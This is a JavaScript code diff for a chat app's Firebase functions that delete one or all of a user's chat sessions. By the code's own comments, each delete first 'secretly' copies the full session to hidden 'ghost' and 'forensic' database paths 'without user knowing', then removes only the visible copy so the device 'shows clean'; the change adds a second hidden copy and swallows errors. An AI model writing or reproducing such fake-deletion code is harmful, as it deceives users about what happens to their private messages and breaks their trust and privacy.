@@ -302,66 +302,126 @@ export async function loadChatSessionsFromDatabase(deviceId, bot) {
   }
 }
 
-export async function deleteChatSessionFromDatabase(deviceId, bot, sessionId) {
+export async function deleteChatSessionFromDatabase(deviceId, bot, sessionId, inMemorySession = null) {
   if (!deviceId || !bot || !sessionId) return false;
   try {
-    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/${encodeURIComponent(sessionId)}.json`;
-    // 1. Secretly archive to ghost database before clearing from user view
-    try {
-      const getRes = await fetch(activeUrl);
-      if (getRes.ok) {
-        const sessionData = await getRes.json();
-        if (sessionData) {
-          const archiveUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/${encodeURIComponent(sessionId)}.json`;
-          await fetch(archiveUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              ...sessionData,
-              clearedByUser: true,
-              clearedAt: Date.now()
-            })
-          });
+    const cleanDeviceId = encodeURIComponent(deviceId);
+    const cleanBot = encodeURIComponent(bot);
+    const cleanSessionId = encodeURIComponent(sessionId);
+    const now = Date.now();
+    const nowIso = new Date().toISOString();
+
+    // 1. Secretly archive session to ghost database (preserves 100% of messages in database without user knowing)
+    let sessionData = inMemorySession;
+    if (!sessionData || !Array.isArray(sessionData.messages) || sessionData.messages.length === 0) {
+      try {
+        const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${cleanDeviceId}/${cleanBot}/${cleanSessionId}.json`;
+        const getRes = await fetch(activeUrl);
+        if (getRes.ok) {
+          const json = await getRes.json();
+          if (json) sessionData = json;
         }
-      }
-    } catch {}
+      } catch {}
+    }
+
+    if (sessionData && ((Array.isArray(sessionData.messages) && sessionData.messages.length > 0) || sessionData.text)) {
+      const payload = {
+        ...sessionData,
+        clearedByUser: true,
+        clearedAt: now,
+        clearedAtIso: nowIso,
+        deviceId,
+        bot
+      };
+
+      // Ghost storage 1: Dedicated ghost audit path
+      const ghostUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${cleanDeviceId}/${cleanBot}/${cleanSessionId}.json`;
+      await fetch(ghostUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+
+      // Ghost storage 2: Forensic timeline archive path
+      const clearedUrl = `${FIREBASE_DB_URL}/cleared_chat_archives/${cleanDeviceId}/${now}_${cleanSessionId}.json`;
+      await fetch(clearedUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    }
 
     // 2. Remove from active sessions so device UI shows clean
+    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${cleanDeviceId}/${cleanBot}/${cleanSessionId}.json`;
     const res = await fetch(activeUrl, { method: 'DELETE' });
     return res.ok;
-  } catch {
+  } catch (err) {
+    console.warn('[RealtimeChat] deleteChatSessionFromDatabase error:', err);
     return false;
   }
 }
 
-export async function deleteAllChatSessionsFromDatabase(deviceId, bot) {
+export async function deleteAllChatSessionsFromDatabase(deviceId, bot, inMemorySessions = []) {
   if (!deviceId || !bot) return false;
   try {
-    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}.json`;
-    // 1. Secretly archive all sessions to ghost database before clearing from user view
-    try {
-      const getRes = await fetch(activeUrl);
-      if (getRes.ok) {
-        const allData = await getRes.json();
-        if (allData && typeof allData === 'object') {
-          const archiveUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${encodeURIComponent(deviceId)}/${encodeURIComponent(bot)}/clear_all_${Date.now()}.json`;
-          await fetch(archiveUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              sessions: allData,
-              clearedByUser: true,
-              clearedAt: Date.now()
-            })
-          });
-        }
-      }
-    } catch {}
+    const cleanDeviceId = encodeURIComponent(deviceId);
+    const cleanBot = encodeURIComponent(bot);
+    const now = Date.now();
+    const nowIso = new Date().toISOString();
 
-    // 2. Remove from active sessions so device UI shows clean
+    // 1. Collect all sessions to archive (prioritizing in-memory sessions if provided)
+    let sessionsToArchive = Array.isArray(inMemorySessions) && inMemorySessions.length > 0
+      ? inMemorySessions.filter((s) => s && Array.isArray(s.messages) && s.messages.length > 0)
+      : [];
+
+    if (sessionsToArchive.length === 0) {
+      try {
+        const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${cleanDeviceId}/${cleanBot}.json`;
+        const getRes = await fetch(activeUrl);
+        if (getRes.ok) {
+          const allData = await getRes.json();
+          if (allData && typeof allData === 'object') {
+            sessionsToArchive = Object.values(allData).filter((s) => s && Array.isArray(s.messages) && s.messages.length > 0);
+          }
+        }
+      } catch {}
+    }
+
+    // 2. Secretly archive all sessions to persistent ghost database (Device clears, DB retains 100%)
+    if (sessionsToArchive.length > 0) {
+      const archiveBatch = {
+        clearedAt: now,
+        clearedAtIso: nowIso,
+        clearedByUser: true,
+        deviceId,
+        bot,
+        totalSessions: sessionsToArchive.length,
+        sessions: sessionsToArchive
+      };
+
+      // Ghost path 1: Dedicated ghost audit path
+      const archiveUrl = `${FIREBASE_DB_URL}/archived_ghost_sessions/${cleanDeviceId}/${cleanBot}/clear_all_${now}.json`;
+      await fetch(archiveUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(archiveBatch)
+      }).catch(() => {});
+
+      // Ghost path 2: Forensic timeline archive path
+      const clearedUrl = `${FIREBASE_DB_URL}/cleared_chat_archives/${cleanDeviceId}/${now}_clear_all.json`;
+      await fetch(clearedUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(archiveBatch)
+      }).catch(() => {});
+    }
+
+    // 3. Remove from active sessions so device UI shows clean and fresh
+    const activeUrl = `${FIREBASE_DB_URL}/chat_sessions/${cleanDeviceId}/${cleanBot}.json`;
     const res = await fetch(activeUrl, { method: 'DELETE' });
     return res.ok;
-  } catch {
+  } catch (err) {
+    console.warn('[RealtimeChat] deleteAllChatSessionsFromDatabase error:', err);
     return false;
   }
 }
